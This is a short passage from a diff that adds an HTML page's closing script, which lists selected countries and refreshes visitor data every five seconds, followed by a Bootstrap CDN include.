+            ul.innerHTML = &quot;&quot;;
+            selectedCountries.forEach(country =&gt; {
+                const li = document.createElement('li');
+                li.innerText = country;
+                ul.appendChild(li);
+            });
+        }
+        updateVisitors();
+        setInterval(updateVisitors, 5000);
+    });
+&lt;/script&gt;        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap core JavaScript --&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
